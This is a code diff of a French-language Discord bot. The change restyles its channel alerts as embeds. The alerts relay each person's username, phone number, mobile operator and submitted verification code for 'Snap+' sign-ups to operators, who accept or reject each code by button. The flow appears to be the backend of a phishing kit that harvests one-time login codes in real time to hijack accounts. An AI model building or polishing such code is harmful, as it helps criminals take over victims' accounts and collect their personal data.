@@ -13,6 +13,9 @@ const client = new Client({
     intents: [GatewayIntentBits.Guilds]
 });
 
+// Ligne de séparation pour donner de la largeur
+const SEPARATOR = '──────────────────────────────────────────────';
+
 client.once('ready', () => {
     console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
 });
@@ -24,36 +27,26 @@ client.on('interactionCreate', async interaction => {
     const user = users[username];
 
     if (!user) {
-        return interaction.reply({
-            content: 'Utilisateur introuvable.',
-            ephemeral: true
-        });
+        return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
     }
 
     if (action === 'accept') {
         user.status = 'verified';
+        const embed = new EmbedBuilder()
+            .setColor('#2ecc71')
+            .setDescription(
+                `@everyone\n` +
+                `# ✅ Code validé\n` +
+                `${SEPARATOR}\n` +
+                `👤 **Nom d'utilisateur:** ${username}\n` +
+                `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `🔢 **Code:** \`${user.submittedCode}\`\n` +
+                `📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `${SEPARATOR}\n` +
+                `*Utilisateur vérifié*`
+            );
 
-        await interaction.update({
-            flags: 32768, // IS_COMPONENTS_V2
-            components: [
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `✅ Code validé pour ${username}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `🔢 Code: ${user.submittedCode}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
-                }
-            ]
-        });
+        await interaction.update({ content: '', embeds: [embed], components: [] });
     }
 
     if (action === 'reject') {
@@ -61,77 +54,50 @@ client.on('interactionCreate', async interaction => {
         const rejectedCode = user.submittedCode;
         user.submittedCode = null;
 
-        await interaction.update({
-            flags: 32768, // IS_COMPONENTS_V2
-            components: [
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `🔒 Code rejeté pour ${username}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `🔢 Code saisi: ${rejectedCode || 'N/A'}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
-                },
-                {
-                    type: 10, // ComponentType.TEXT_DISPLAY
-                    content: `📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
-                }
-            ]
-        });
+        const embed = new EmbedBuilder()
+            .setColor('#e74c3c')
+            .setDescription(
+                `@everyone\n` +
+                `# 🔒 Code rejeté\n` +
+                `${SEPARATOR}\n` +
+                `👤 **Nom d'utilisateur:** ${username}\n` +
+                `🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
+                `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+                `📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+                `${SEPARATOR}\n` +
+                `*L’utilisateur devra ressaisir le code*`
+            );
+
+        await interaction.update({ content: '', embeds: [embed], components: [] });
     }
 });
 
 function formatPhoneNumber(phone) {
     if (!phone) return 'N/A';
-    if ((phone.startsWith('06') || phone.startsWith('07')) && phone.length === 10) {
-        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
-    }
-    if ((phone.startsWith('6') || phone.startsWith('7')) && phone.length === 9) {
-        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{3})/, '$1 $2 $3 $4');
-    }
-    return phone;
+    return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
 }
 
 async function sendInitialEmbed(username, phone) {
     const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
     const user = users[username];
 
+    const embed = new EmbedBuilder()
+        .setColor('#2b2d31')
+        .setDescription(
+            `@everyone\n` +
+            `# 📱 Nouvelle inscription Snap+\n` +
+            `${SEPARATOR}\n` +
+            `👤 **Nom d'utilisateur:** ${username}\n` +
+            `📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
+            `🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
+            `⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `${SEPARATOR}\n` +
+            `*En attente du code...*`
+        );
+
     await channel.send({
-        flags: 32768, // IS_COMPONENTS_V2
-        components: [
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: '@everyone'
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `📱 Nouvelle inscription Snap+`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `👤 Nom d'utilisateur: ${username}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `📞 Téléphone: ${formatPhoneNumber(phone)}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `🏛️ Opérateur: ${user.operator || 'N/A'}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: '*En attente du code...*'
-            }
-        ]
+        content: '', // Vide ici pour ne pas avoir de texte au-dessus
+        embeds: [embed]
     });
 }
 
@@ -139,61 +105,28 @@ async function sendCodeEmbed(username) {
     const user = users[username];
     const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
 
-    await channel.send({
-        flags: 32768, // IS_COMPONENTS_V2
-        components: [
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: '@everyone'
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `🔒 Code de vérification soumis`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `👤 Nom d'utilisateur: ${username}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `🔢 Code saisi: ${user.submittedCode}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: `📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
-            },
-            {
-                type: 10, // ComponentType.TEXT_DISPLAY
-                content: '*En attente de validation par un modérateur*'
-            },
-            {
-                type: 1, // ComponentType.ACTION_ROW
-                components: [
-                    {
-                        type: 2, // ComponentType.BUTTON
-                        custom_id: `accept:${username}`,
-                        label: 'Accepter',
-                        style: ButtonStyle.Success
-                    },
-                    {
-                        type: 2, // ComponentType.BUTTON
-                        custom_id: `reject:${username}`,
-                        label: 'Refuser',
-                        style: ButtonStyle.Danger
-                    }
-                ]
-            }
-        ]
-    });
+    const embed = new EmbedBuilder()
+        .setColor('#f1c40f')
+        .setDescription(
+            `@everyone\n` +
+            `# 🔒 Code de vérification soumis\n` +
+            `${SEPARATOR}\n` +
+            `👤 **Nom d'utilisateur:** ${username}\n` +
+            `🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
+            `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
+            `📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
+            `${SEPARATOR}\n` +
+            `*En attente de validation par un modérateur*`
+        );
+
+    const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`accept:${username}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId(`reject:${username}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
+    );
+
+    await channel.send({ content: '', embeds: [embed], components: [row] });
 }
 
 client.login(process.env.BOT_TOKEN);
 
-module.exports = {
-    sendInitialEmbed,
-    sendCodeEmbed
-};
+module.exports = { sendInitialEmbed, sendCodeEmbed };
